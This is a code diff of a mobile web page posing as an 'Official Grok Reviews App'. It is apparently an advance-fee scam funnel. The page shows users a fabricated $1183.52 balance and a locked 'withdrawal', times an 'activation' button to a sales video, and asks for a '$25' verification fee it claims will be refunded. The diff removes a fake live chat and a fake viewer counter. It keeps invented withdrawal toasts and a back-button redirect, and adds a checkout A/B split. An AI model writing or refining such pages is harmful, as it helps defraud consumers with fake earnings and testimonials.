@@ -12,17 +12,12 @@
 <link rel="apple-touch-icon" href="/favicon-64.png"/>
 <script src="https://click-charm-73.lovable.app/funnel.js?w=976e24b0-6a4d-4dd1-90af-7b0e1f18cfdd&f=9af23cbc-93d1-4812-9666-84637488d471" data-auto="true" defer></script>
 <link rel="preload" as="image" href="/robot-header-logo.png"/>
-<link rel="preload" as="image" href="/profile-rocket.png"/>
 <script src="https://cdn.tailwindcss.com/3.4.16"></script>
 <script>
 tailwind.config={theme:{extend:{colors:{background:'#f8fafc',foreground:'#0f172a',card:'#ffffff',primary:'#10b981','primary-foreground':'#ffffff','muted-foreground':'#64748b',border:'#e2e8f0',muted:'#f1f5f9'}}}}
 </script>
 <style>
 body{font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f8fafc;margin:0;color:#0f172a}
-@keyframes pulse-dot{0%,100%{opacity:1}50%{opacity:.4}}.pulse-dot{animation:pulse-dot 1.5s ease-in-out infinite}
-@keyframes fadeSlideUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}.chat-in{animation:fadeSlideUp .5s ease-out forwards}
-@keyframes modalSlideUp{from{opacity:0;transform:translateY(100%)}to{opacity:1;transform:translateY(0)}}.modal-slide{animation:modalSlideUp .3s ease-out forwards}
-@keyframes progressBar{from{width:0}to{width:100%}}
 </style>
 </head>
 <body class="font-sans antialiased">
@@ -51,107 +46,11 @@ body{font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sa
   <div class="w-full max-w-sm rounded-3xl border border-emerald-400/50 bg-white p-6 text-center shadow-2xl">
     <h2 class="text-2xl font-black leading-tight text-[#0f172a]">Welcome to the Official Grok Reviews App</h2>
     <p class="mt-4 text-sm font-semibold leading-relaxed text-[#64748b]">To activate the app and complete your withdrawal, watch the video below:</p>
-    <ul class="mt-4 space-y-3 text-left text-sm font-medium leading-relaxed text-[#0f172a]">
-      <li class="flex gap-3"><span class="font-black text-emerald-500">•</span><span>Watch the video until the end</span></li>
-    </ul>
     <button id="btn-close-welcome" type="button" data-funnel-step="yes_i_do1" class="mt-6 w-full rounded-xl bg-emerald-500 px-4 py-3 text-sm font-black uppercase tracking-wide text-emerald-950 shadow-lg shadow-emerald-500/20 transition hover:bg-emerald-400 active:scale-[0.98]">Watch Video</button>
   </div>
 </div>
 
-<!-- WALLET MODAL -->
-<div id="wallet-modal" class="fixed inset-0 z-[80] flex items-end justify-center bg-black/50 backdrop-blur-sm hidden" onclick="if(event.target===this)this.classList.add('hidden')">
-  <div class="w-full max-w-md rounded-t-3xl bg-white p-5 shadow-2xl modal-slide max-h-[85vh] overflow-y-auto">
-    <div class="flex items-center justify-between mb-4">
-      <div class="flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="18" x="3" y="3" rx="2"/><path d="M3 9a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2"/><path d="M3 11h3c.8 0 1.6.3 2.1.9l1.1.9c1.6 1.6 4.1 1.6 5.7 0l1.1-.9c.5-.5 1.3-.9 2.1-.9H21"/></svg><h3 class="text-lg font-black">My Wallet</h3></div>
-      <button onclick="document.getElementById('wallet-modal').classList.add('hidden')" class="rounded-full p-1 hover:bg-gray-100"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg></button>
-    </div>
-    <div class="rounded-2xl border border-[#e2e8f0] p-4">
-      <div class="flex justify-between text-center">
-        <div><p class="text-[9px] font-bold uppercase tracking-wider text-[#64748b]">Withdrawn balance</p><p class="text-xl font-black text-[#0f172a]">$1150.43</p></div>
-        <div><p class="text-[9px] font-bold uppercase tracking-wider text-[#64748b]">New available balance</p><p class="text-xl font-black text-emerald-500">$30.10</p></div>
-      </div>
-      <div class="mt-3 pt-3 border-t border-[#e2e8f0] text-center">
-        <p class="text-[9px] font-bold uppercase tracking-wider text-[#64748b]">Total balance</p>
-        <p class="text-2xl font-black text-emerald-500">$1183.52</p>
-      </div>
-      <div class="mt-3 pt-3 border-t border-[#e2e8f0] text-center">
-        <p id="wallet-name" class="text-sm font-bold text-[#0f172a]">User</p>
-        <p id="wallet-email" class="text-xs text-[#64748b]">PayPal: email@example.com</p>
-      </div>
-    </div>
-    <div class="mt-4 rounded-2xl border border-[#e2e8f0] p-4">
-      <div class="flex items-center justify-between mb-3">
-        <div class="flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><span class="text-xs font-black uppercase tracking-wider text-[#0f172a]">Withdrawal history</span></div>
-        <span class="text-[10px] font-bold uppercase tracking-wider text-[#64748b]">1 transaction</span>
-      </div>
-      <div class="border-t border-[#e2e8f0] pt-3">
-        <div class="flex justify-between text-[9px] font-bold uppercase tracking-wider text-[#64748b] mb-2"><span>Transaction</span><span>Amount</span></div>
-        <div class="flex justify-between items-start">
-          <div>
-            <div class="flex items-center gap-1.5"><span class="size-2 rounded-full bg-amber-400"></span><p class="text-sm font-bold text-[#0f172a]">Pending withdrawal</p></div>
-            <p id="wallet-email2" class="text-xs text-[#64748b] mt-0.5">To email@example.com</p>
-            <p class="text-[10px] font-bold uppercase tracking-wider text-[#64748b] mt-1">STATUS: PENDING</p>
-          </div>
-          <p class="text-sm font-black tabular-nums text-[#0f172a]">$1150.43</p>
-        </div>
-      </div>
-      <div class="mt-3 rounded-xl bg-red-50 border border-red-200 p-3 text-center">
-        <p class="text-xs font-semibold text-red-500">Watch the video to have the withdrawal approved.</p>
-      </div>
-    </div>
-    <button class="mt-4 w-full rounded-xl bg-gray-200 py-3 text-sm font-black uppercase tracking-wide text-gray-400 cursor-not-allowed" disabled>Withdraw</button>
-    <p class="mt-2 text-center text-xs font-semibold text-red-500">Watch the video to unlock.</p>
-  </div>
-</div>
-
-<!-- ACTIVATE MODAL -->
-<div id="activate-modal" class="fixed inset-0 z-[80] flex items-center justify-center bg-black/50 backdrop-blur-sm hidden px-4" onclick="if(event.target===this)this.classList.add('hidden')">
-  <div class="w-full max-w-sm rounded-2xl bg-white p-6 text-center shadow-2xl">
-    <div class="flex justify-end mb-2"><button onclick="document.getElementById('activate-modal').classList.add('hidden')" class="rounded-full p-1 hover:bg-gray-100"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg></button></div>
-    <div class="mx-auto mb-4 flex size-16 items-center justify-center rounded-full bg-emerald-100">
-      <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>
-    </div>
-    <h3 class="text-xl font-black text-[#0f172a]">Activate your app</h3>
-    <p class="mt-2 text-sm text-[#64748b]">Use the activation button below to activate your app and unlock your withdrawal.</p>
-    <div class="mt-4 h-2 w-full overflow-hidden rounded-full bg-gray-200">
-      <div class="h-full rounded-full bg-emerald-500" style="width:33%;animation:none"></div>
-    </div>
-  </div>
-</div>
-
-<!-- PROFILE MODAL -->
-<div id="profile-modal" class="fixed inset-0 z-[80] flex items-center justify-center bg-black/50 backdrop-blur-sm hidden px-4" onclick="if(event.target===this)this.classList.add('hidden')">
-  <div class="w-full max-w-sm rounded-2xl bg-white p-6 shadow-2xl">
-    <div class="flex items-center justify-between mb-2">
-      <div class="flex items-center gap-3">
-        <div class="flex size-12 items-center justify-center rounded-full bg-emerald-100 text-emerald-500"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="5"/><path d="M20 21a8 8 0 0 0-16 0"/></svg></div>
-        <div><h3 class="text-lg font-black text-[#0f172a]">Link your profile</h3><p class="text-sm text-[#64748b]">Connect your Grok Reviews profile</p></div>
-      </div>
-      <button onclick="document.getElementById('profile-modal').classList.add('hidden')" class="rounded-full p-1 hover:bg-gray-100"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg></button>
-    </div>
-    <div class="mt-4 flex items-center gap-3">
-      <div id="profile-avatar" class="flex size-12 items-center justify-center rounded-full bg-emerald-500 text-xl font-black text-white">U</div>
-      <div><p id="profile-name" class="text-base font-bold text-[#0f172a]">User</p><p id="profile-email" class="text-sm text-[#64748b]">email@example.com</p></div>
-    </div>
-    <div class="mt-4 rounded-xl border border-emerald-200 bg-emerald-50 p-3">
-      <div class="flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg><span class="text-sm font-bold text-emerald-600">Connected account</span></div>
-      <p class="mt-1 text-sm text-[#64748b]">Your profile <span id="profile-email2" class="font-bold text-[#0f172a]">email@example.com</span> is linked and your withdrawal access is protected.</p>
-    </div>
-  </div>
-</div>
-
-<!-- CANCEL MODAL -->
-<div id="cancel-modal" class="fixed inset-0 z-[80] flex items-end justify-center bg-black/50 backdrop-blur-sm hidden" onclick="if(event.target===this)this.classList.add('hidden')">
-  <div class="w-full max-w-md rounded-t-3xl bg-white p-5 shadow-2xl modal-slide">
-    <div class="flex items-center justify-between mb-4">
-      <h3 class="text-lg font-black">Cancellation</h3>
-      <button onclick="document.getElementById('cancel-modal').classList.add('hidden')" class="rounded-full p-1 hover:bg-gray-100"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg></button>
-    </div>
-    <button class="w-full rounded-xl bg-red-500 py-3 text-sm font-black uppercase tracking-wide text-white">Cancel my account</button>
-  </div>
-</div>
-
-<main class="vsl-theme mx-auto flex min-h-screen w-full max-w-md flex-col bg-[#f8fafc] pb-20 pt-16 text-[#0f172a]">
+<main class="mx-auto flex min-h-screen w-full max-w-md flex-col bg-[#f8fafc] pt-16 pb-6 text-[#0f172a]">
 
   <!-- FIXED HEADER -->
   <header class="fixed inset-x-0 top-0 z-40 mx-auto flex h-16 w-full max-w-md items-center justify-between border-b border-[#e2e8f0]/70 bg-white px-4 py-3 shadow-sm">
@@ -193,73 +92,7 @@ body{font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sa
     <p class="mt-3 text-xs text-white/80">This small fee of US$ 25 is for account verification and will be fully refunded within one business day.</p>
   </section>
 
-  <!-- MANDATORY TASKS COMPLETED BANNER -->
-  <section id="mandatory-banner" class="mx-4 mt-3 rounded-2xl border border-emerald-400/50 bg-emerald-50 px-4 py-4 text-center hidden">
-    <p class="text-sm font-bold uppercase text-emerald-800 leading-snug italic">VIDEO COMPLETED. ACTIVATE THE APP AND VERIFY YOUR ACCOUNT USING THE BUTTON ABOVE TO RECEIVE YOUR WITHDRAWAL AND UNLOCK ALL APP FEATURES.</p>
-  </section>
-
-  <!-- TASK SECTION -->
-  <section class="mx-4 mt-3 rounded-2xl border px-4 py-5 shadow-[0_0_18px_rgba(16,185,129,0.16)] border-emerald-500/50 bg-white">
-    <h2 class="text-center text-lg font-black leading-tight text-[#0f172a]">Watch the video to unlock your withdrawal</h2>
-    <div class="mt-5 space-y-3">
-      <div class="flex items-center gap-3 rounded-xl border border-[#e2e8f0] bg-[#f8fafc] px-3 py-3">
-        <div id="task1-circle" class="relative flex size-11 shrink-0 items-center justify-center rounded-full text-[10px] font-black text-red-500" style="background:conic-gradient(rgb(239 68 68) 0deg, rgb(239 68 68 / 0.2) 0deg)">
-          <span class="flex size-9 items-center justify-center rounded-full bg-[#f8fafc]" id="task1-pct">0%</span>
-        </div>
-        <div class="flex min-w-0 items-center gap-2 text-sm font-semibold text-[#0f172a]">
-          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="size-4 shrink-0 text-red-500" id="task1-icon"><path d="M5 5a2 2 0 0 1 3.008-1.728l11.997 6.998a2 2 0 0 1 .003 3.458l-12 7A2 2 0 0 1 5 19z"/></svg>
-          Watch the video until the end
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- VIEWERS + LIVE CHAT -->
-  <div class="mx-4 mt-3 rounded-2xl border border-[#e2e8f0] bg-white px-4 py-3">
-    <div class="flex items-center gap-2 px-1 py-1">
-      <span class="size-2.5 rounded-full bg-red-500 pulse-dot"></span>
-      <span class="text-sm font-medium text-[#0f172a]"><span class="font-bold tabular-nums text-emerald-500" id="viewer-count">2,251</span> people watching now <span class="text-[#64748b]">in <span id="viewer-country">Brazil</span></span></span>
-    </div>
-    <div class="mt-3 border-t border-[#e2e8f0] pt-3">
-      <p class="text-xs font-bold uppercase tracking-wide text-emerald-500">Live chat</p>
-      <div class="mt-3 flex flex-col gap-2">
-        <div id="chat-messages" class="flex max-h-56 min-h-40 flex-col gap-2 overflow-y-auto pr-1">
-          <div class="flex items-start gap-2 rounded-lg bg-[#f1f5f9]/40 px-2 py-1.5"><img src="/images/user-maria.webp" class="size-5 shrink-0 rounded-full object-cover ring-1 ring-white/20"/><p class="min-w-0 text-[11px] leading-snug"><span class="mr-1 font-bold">@maria_g</span><span class="opacity-90">Finished my first reviews and the balance updated right away 🔥</span></p></div>
-          <div class="flex items-start gap-2 rounded-lg bg-[#f1f5f9]/40 px-2 py-1.5"><img src="/images/user-lucy.webp" class="size-5 shrink-0 rounded-full object-cover ring-1 ring-white/20"/><p class="min-w-0 text-[11px] leading-snug"><span class="mr-1 font-bold">@lucy_v</span><span class="opacity-90">Is it easy? I'm not very technical tbh</span></p></div>
-          <div class="flex items-start gap-2 rounded-lg bg-[#f1f5f9]/40 px-2 py-1.5"><img src="/images/user-carlos.png" class="size-5 shrink-0 rounded-full object-cover ring-1 ring-white/20"/><p class="min-w-0 text-[11px] leading-snug"><span class="mr-1 font-bold">@carlos_r</span><span class="opacity-90">The questions are simple, anyone can do this</span></p></div>
-          <div class="flex items-start gap-2 rounded-lg bg-[#f1f5f9]/40 px-2 py-1.5"><img src="/images/user-anna.png" class="size-5 shrink-0 rounded-full object-cover ring-1 ring-white/20"/><p class="min-w-0 text-[11px] leading-snug"><span class="mr-1 font-bold">@anna_p</span><span class="opacity-90">The app was faster than I expected</span></p></div>
-          <div class="flex items-start gap-2 rounded-lg bg-[#f1f5f9]/40 px-2 py-1.5"><img src="/images/user-robert.png" class="size-5 shrink-0 rounded-full object-cover ring-1 ring-white/20"/><p class="min-w-0 text-[11px] leading-snug"><span class="mr-1 font-bold">@robert_s</span><span class="opacity-90">Just follow the instructions, don't skip the end</span></p></div>
-        </div>
-        <form id="chat-form" class="flex items-center gap-2 border-t border-[#e2e8f0] pt-2" onsubmit="sendChat(event)">
-          <input id="chat-input" placeholder="Write a message..." class="h-10 min-w-0 flex-1 rounded-full border border-[#e2e8f0] bg-[#f8fafc] px-4 text-sm outline-none placeholder:text-[#64748b] focus:ring-2 focus:ring-emerald-500/30" maxlength="180"/>
-          <button type="submit" class="flex size-10 shrink-0 items-center justify-center rounded-full bg-emerald-500 text-white transition hover:opacity-90">
-            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.536 21.686a.5.5 0 0 0 .937-.024l6.5-19a.496.496 0 0 0-.635-.635l-19 6.5a.5.5 0 0 0-.024.937l7.93 3.18a2 2 0 0 1 1.112 1.11z"/><path d="m21.854 2.147-10.94 10.939"/></svg>
-          </button>
-        </form>
-      </div>
-    </div>
-  </div>
 </main>
-
-<!-- BOTTOM NAV -->
-<nav class="fixed inset-x-0 bottom-0 z-40 mx-auto flex h-16 w-full max-w-md items-end justify-around border-t border-[#e2e8f0] bg-white px-2 pb-1 shadow-[0_-8px_24px_rgba(0,0,0,0.08)]">
-  <button type="button" class="flex min-w-14 flex-col items-center gap-0.5 text-[10px] font-medium text-[#64748b] transition active:scale-95" onclick="window.scrollTo({top:0,behavior:'smooth'})">
-    <span class="-mt-5 flex size-12 items-center justify-center rounded-full border-4 border-[#f8fafc] bg-emerald-500 text-white shadow-lg"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 21v-8a1 1 0 0 0-1-1h-4a1 1 0 0 0-1 1v8"/><path d="M3 10a2 2 0 0 1 .709-1.528l7-6a2 2 0 0 1 2.582 0l7 6A2 2 0 0 1 21 10v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/></svg></span>
-    <span class="font-semibold text-emerald-500">Tutorial Livestream</span>
-  </button>
-  <button type="button" onclick="document.getElementById('wallet-modal').classList.remove('hidden')" class="flex min-w-14 flex-col items-center gap-0.5 text-[10px] font-medium text-[#64748b] transition active:scale-95">
-    <span class="flex size-7 items-center justify-center"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="18" x="3" y="3" rx="2"/><path d="M3 9a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2"/><path d="M3 11h3c.8 0 1.6.3 2.1.9l1.1.9c1.6 1.6 4.1 1.6 5.7 0l1.1-.9c.5-.5 1.3-.9 2.1-.9H21"/></svg></span>
-    <span>Wallet</span>
-  </button>
-  <button type="button" onclick="document.getElementById('profile-modal').classList.remove('hidden')" class="flex min-w-14 flex-col items-center gap-0.5 text-[10px] font-medium text-[#64748b] transition active:scale-95">
-    <span class="flex size-7 items-center justify-center"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="5"/><path d="M20 21a8 8 0 0 0-16 0"/></svg></span>
-    <span>Profile</span>
-  </button>
-  <button type="button" onclick="document.getElementById('cancel-modal').classList.remove('hidden')" class="flex min-w-14 flex-col items-center gap-0.5 text-[10px] font-medium text-[#64748b] transition active:scale-95">
-    <span class="flex size-7 items-center justify-center"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg></span>
-    <span>Cancel</span>
-  </button>
-</nav>
 
 <script>
 (function(){
@@ -267,55 +100,29 @@ var P=window.location.search;
 var params=new URLSearchParams(P);
 function go(u){window.location.href=u+P}
 
-var fullName=(params.get('first_name')||'')+(params.get('last_name')?' '+params.get('last_name'):'');
-var firstName=params.get('first_name')||'';
-var email=params.get('email')||'';
-if(fullName){document.getElementById('wallet-name').textContent=fullName;document.getElementById('profile-name').textContent=fullName}
-if(email){document.getElementById('wallet-email').textContent='PayPal: '+email;document.getElementById('wallet-email2').textContent='To '+email;document.getElementById('profile-email').textContent=email;document.getElementById('profile-email2').textContent=email}
-if(firstName){document.getElementById('profile-avatar').textContent=firstName.charAt(0).toUpperCase()}
-
-fetch('/api/geo-country').then(function(r){return r.json()}).then(function(d){if(d.countryName)document.getElementById('viewer-country').textContent=d.countryName}).catch(function(){});
-
 // Welcome modal
 document.getElementById('btn-close-welcome').addEventListener('click',function(){document.getElementById('welcome-modal').classList.add('hidden')});
 
-// Activate → checkout (locked until PITCH_TIME)
-document.getElementById('btn-activate').addEventListener('click',function(){go('/pay')});
+// A/B test: 50/50 split between checkout A (PayPal) and checkout B (Digistore24)
+var checkoutPath=Math.random()<0.5?'/pay':'/pay-b';
+document.getElementById('btn-activate').addEventListener('click',function(){go(checkoutPath)});
 
 // Video progress — activation appears at 17:00 (1020s)
 var PITCH_TIME=1020;
-var vPct=0,videoComplete=false,pitchReached=false;
-var t1c=document.getElementById('task1-circle'),t1p=document.getElementById('task1-pct');
 var activationSection=document.getElementById('activation-section');
-var mandatoryBanner=document.getElementById('mandatory-banner');
 var headerBal=document.getElementById('header-balance');
-var elapsedSec=0;
+var elapsedSec=0,pitchReached=false;
 
 setInterval(function(){
   elapsedSec++;
-  if(vPct>=100){if(!videoComplete){videoComplete=true;onVideoComplete()}return}
-  vPct=Math.min(vPct+0.56,100);
-  var deg=Math.round(vPct*3.6);
-  var col=vPct>=100?'rgb(16 185 129)':'rgb(239 68 68)';
-  t1c.style.background='conic-gradient('+col+' '+deg+'deg, rgb(239 68 68 / 0.2) '+deg+'deg)';
-  t1p.textContent=Math.round(vPct)+'%';
-  if(!pitchReached&&elapsedSec>=PITCH_TIME){pitchReached=true;showActivation()}
+  if(!pitchReached&&elapsedSec>=PITCH_TIME){
+    pitchReached=true;
+    activationSection.classList.remove('hidden');
+    headerBal.textContent='$1183.52';
+  }
 },1000);
 
-function showActivation(){
-  activationSection.classList.remove('hidden');
-  mandatoryBanner.classList.remove('hidden');
-  headerBal.textContent='$1183.52';
-}
-
-function onVideoComplete(){
-  t1c.className=t1c.className.replace('text-red-500','text-emerald-500');
-  t1p.textContent='100%';
-  t1c.style.background='conic-gradient(rgb(16 185 129) 360deg, rgb(16 185 129 / 0.2) 360deg)';
-  if(!pitchReached){pitchReached=true;showActivation()}
-}
-
-// Social proof
+// Social proof toasts
 var PEOPLE=[{n:'Grace D.',c:'Amsterdam',a:'/images/user-anna.png',m:'Just completed a review and earned $350.00'},{n:'Ethan S.',c:'Canberra',a:'/images/user-carlos.png',m:'Just withdrew $1,150.43 via PayPal'},{n:'Mia R.',c:'Singapore',a:'/images/user-robert.png',m:'Just completed a review and earned $350.00'},{n:'Noah G.',c:'Vienna',a:'/images/user-anna.png',m:'Just withdrew $1,150.43 via PayPal'}];
 var st=document.getElementById('social-toast'),si=0;
 function showSocialToast(){var p=PEOPLE[si++%PEOPLE.length];document.getElementById('toast-name').textContent=p.n;document.getElementById('toast-city').textContent=p.c;document.getElementById('toast-avatar').src=p.a;document.getElementById('toast-msg').textContent=p.m;st.style.transition='all .5s';st.style.transform='translateY(0)';st.style.opacity='1';setTimeout(function(){st.style.transform='translateY(-24px)';st.style.opacity='0'},5000)}
@@ -323,29 +130,6 @@ setTimeout(showSocialToast,12000);setInterval(showSocialToast,18000);
 
 // PayPal toast
 setTimeout(function(){var pt=document.getElementById('paypal-toast');pt.style.transition='all .5s';pt.style.transform='translateY(0)';pt.style.opacity='1';setTimeout(function(){pt.style.transform='translateY(-24px)';pt.style.opacity='0'},6000)},8000);
-
-// Viewer count fluctuation
-setInterval(function(){var v=2200+Math.floor(Math.random()*600);document.getElementById('viewer-count').textContent=v.toLocaleString()},15000);
-
-// Live chat
-var NEW_CHATS=[{n:'@laura_m',m:'Surprised, the AI questions are not confusing at all',a:'/images/user-lucy.webp'},{n:'@diego_f',m:'Completed all 3 reviews, balance showed $1,150.43 💰',a:'/images/user-carlos.png'},{n:'@kevin_b',m:'This is actually working lol let\'s go',a:'/images/user-robert.png'},{n:'@sophia_l',m:'Watching from the UK 🇬🇧 this is amazing',a:'/images/user-maria.webp'},{n:'@james_t',m:'How long until I can withdraw?',a:'/images/user-carlos.png'},{n:'@emma_w',m:'Just joined, what did I miss??',a:'/images/user-anna.png'},{n:'@david_k',m:'Elon really launched this, insane 🚀',a:'/images/user-robert.png'},{n:'@olivia_m',m:'My friend told me yesterday, so glad I\'m here',a:'/images/user-lucy.webp'}];
-var ci=0,chatEl=document.getElementById('chat-messages');
-setInterval(function(){var c=NEW_CHATS[ci++%NEW_CHATS.length];var div=document.createElement('div');div.className='flex items-start gap-2 rounded-lg bg-[#f1f5f9]/40 px-2 py-1.5 chat-in';div.innerHTML='<img src="'+c.a+'" class="size-5 shrink-0 rounded-full object-cover ring-1 ring-white/20"/><p class="min-w-0 text-[11px] leading-snug"><span class="mr-1 font-bold">'+c.n+'</span><span class="opacity-90">'+c.m+'</span></p>';chatEl.appendChild(div);chatEl.scrollTop=chatEl.scrollHeight},7000);
-
-// Chat send
-window.sendChat=function(e){
-  e.preventDefault();
-  var inp=document.getElementById('chat-input');
-  var msg=inp.value.trim();
-  if(!msg)return;
-  inp.value='';
-  var name=fullName||'You';
-  var div=document.createElement('div');
-  div.className='flex items-start gap-2 rounded-lg bg-emerald-50 px-2 py-1.5 chat-in';
-  div.innerHTML='<div class="flex size-5 shrink-0 items-center justify-center rounded-full bg-emerald-500 text-[9px] font-bold text-white">'+name.charAt(0).toUpperCase()+'</div><p class="min-w-0 text-[11px] leading-snug"><span class="mr-1 font-bold">'+name+'</span><span class="opacity-90">'+msg.replace(/</g,'&lt;')+'</span></p>';
-  chatEl.appendChild(div);
-  chatEl.scrollTop=chatEl.scrollHeight;
-};
 
 // Back redirect
 var backTarget='/vsl-2';
